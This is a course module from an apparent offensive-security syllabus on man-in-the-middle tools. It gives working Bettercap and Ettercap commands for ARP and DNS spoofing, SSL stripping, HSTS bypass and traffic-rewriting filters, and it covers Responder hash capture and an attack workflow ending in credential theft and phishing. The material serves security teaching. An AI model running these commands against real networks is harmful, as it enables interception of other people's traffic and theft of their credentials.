# MitM Frameworks (Bettercap, Ettercap)

## Unit 5 - Topic 6 | Man-in-the-Middle Attacks

---

## Overview

**MitM frameworks** provide integrated tools for performing man-in-the-middle attacks, combining ARP spoofing, DNS spoofing, credential capture, SSL stripping, and more into a single platform. **Bettercap** (modern) and **Ettercap** (classic) are the two dominant frameworks.

---

## 1. Bettercap — Modern MitM Framework

```bash
# === INSTALLATION ===
apt install bettercap
# Or: go install github.com/bettercap/bettercap@latest

# === BASIC USAGE ===
sudo bettercap -iface eth0

# === INTERACTIVE COMMANDS ===
# Network discovery:
net.probe on          # Discover hosts
net.show              # List discovered hosts

# ARP spoofing:
set arp.spoof.targets 192.168.1.10
set arp.spoof.fullduplex true
arp.spoof on

# DNS spoofing:
set dns.spoof.domains login.target.com
set dns.spoof.address 10.0.0.50
dns.spoof on

# Network sniffing:
set net.sniff.verbose true
net.sniff on

# HTTP proxy (SSL stripping):
set http.proxy.sslstrip true
http.proxy on

# HTTPS proxy:
set https.proxy.sslstrip true
https.proxy on

# === CAPLETS (Automation Scripts) ===
# Run a caplet:
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
# Automated HSTS bypass attack

# List built-in caplets:
caplets.show

# === FULL ATTACK CAPLET ===
# Create file: full_mitm.cap
# net.probe on
# set arp.spoof.targets 192.168.1.0/24
# arp.spoof on
# set net.sniff.verbose true
# net.sniff on

sudo bettercap -iface eth0 -caplet full_mitm.cap
```

---

## 2. Ettercap — Classic MitM Framework

```bash
# === TEXT MODE ===
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//
# -T: Text mode
# -q: Quiet (suppress packet content)
# -M arp:remote: ARP MitM mode
# /TARGET1// /TARGET2//: Victim and Gateway

# === GUI MODE ===
ettercap -G
# Graphical interface
# Sniff → Unified sniffing → Select interface
# Hosts → Scan for hosts → Host list
# Select Target 1 and Target 2
# Mitm → ARP poisoning → Sniff remote connections
# Start → Start sniffing

# === WITH DNS SPOOFING ===
# Edit /etc/ettercap/etter.dns:
# target.com  A  10.0.0.50
# *.target.com  A  10.0.0.50

ettercap -T -q -i eth0 -M arp:remote -P dns_spoof \
  /192.168.1.10// /192.168.1.1//

# === FILTERS ===
# Ettercap can modify traffic in real-time
# Create filter file (replace.filter):
# if (ip.proto == TCP && tcp.dst == 80) {
#    if (search(DATA.data, "Accept-Encoding")) {
#       replace("Accept-Encoding", "Accept-Rubbish!");
#    }
# }

# Compile and use:
etterfilter replace.filter -o replace.ef
ettercap -T -q -F replace.ef -M arp:remote /victim// /gateway//
```

---

## 3. Framework Comparison

| Feature | Bettercap | Ettercap |
|---------|:---------:|:--------:|
| **Language** | Go | C |
| **Interface** | CLI + Web UI | CLI + GTK GUI |
| **Active development** | ✅ Yes | ⚠️ Limited |
| **ARP spoofing** | ✅ | ✅ |
| **DNS spoofing** | ✅ | ✅ (plugin) |
| **SSL stripping** | ✅ Built-in | ❌ External |
| **HSTS bypass** | ✅ Caplet | ❌ |
| **WiFi attacks** | ✅ | ❌ |
| **BLE attacks** | ✅ | ❌ |
| **Scripting** | Caplets (JS) | Filters |
| **Credential capture** | ✅ Built-in | ✅ Built-in |
| **Packet injection** | ✅ | ✅ |
| **Recommended** | ✅ Modern choice | Legacy use |

---

## 4. Other MitM Tools

```bash
# === MITMPROXY (HTTP/HTTPS Proxy) ===
mitmproxy
# Interactive HTTPS proxy with TUI
# Can modify requests/responses in real-time
# Great for web application testing

# === RESPONDER (Windows Networks) ===
sudo responder -I eth0 -wrfud
# LLMNR/NBT-NS/mDNS poisoning
# Captures NTLMv2 hashes
# Best for Windows Active Directory environments

# === MITMF (MitM Framework) ===
mitmf --arp --spoof --gateway 192.168.1.1 \
  --target 192.168.1.10 -i eth0

# === EVILGRADE (Update Exploitation) ===
evilgrade
# Serves fake software updates during MitM
# Exploits insecure update mechanisms

# === WIFI-PUMPKIN3 (Rogue AP) ===
wifi-pumpkin3
# Creates rogue access point for MitM
# Includes captive portal, SSL stripping
```

---

## 5. MitM Attack Workflow

```
COMPLETE MitM ENGAGEMENT:

1. RECONNAISSANCE
   ├── net.probe on (Bettercap)
   ├── Identify targets and gateway
   └── Map network topology

2. POSITION (Choose MitM Method)
   ├── ARP spoofing (same subnet)
   ├── DHCP poisoning (new clients)
   ├── Rogue AP (wireless)
   └── LLMNR poisoning (Windows)

3. INTERCEPT
   ├── Enable IP forwarding
   ├── Start sniffing
   ├── SSL stripping (if applicable)
   └── DNS spoofing (redirect specific domains)

4. CAPTURE
   ├── Credentials (HTTP, FTP, etc.)
   ├── NTLMv2 hashes (Responder)
   ├── Session tokens
   └── Sensitive data

5. EXPLOIT
   ├── Crack captured hashes
   ├── Relay authentication
   ├── Inject payloads
   └── Redirect to phishing pages

6. CLEANUP
   ├── Stop spoofing
   ├── Restore ARP tables
   └── Document findings
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Bettercap** | Modern, Go-based, best current MitM framework |
| **Ettercap** | Classic C-based, legacy but still functional |
| **Caplets** | Bettercap automation scripts |
| **Responder** | Windows network hash capture |
| **mitmproxy** | HTTP/HTTPS interactive proxy |
| **Workflow** | Recon → Position → Intercept → Capture → Exploit |

---

## Quick Revision Questions

1. **What advantages does Bettercap have over Ettercap?**
2. **What are caplets in Bettercap?**
3. **How do you perform DNS spoofing with Ettercap?**
4. **When would you use Responder instead of Bettercap?**
5. **What are the five phases of a MitM engagement?**

---

[← Previous: SSL Stripping Concepts](05-ssl-stripping-concepts.md)

---

*Unit 5 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Network Protocol Attacks →](../06-Network-Protocol-Attacks/01-smb-attacks.md)*
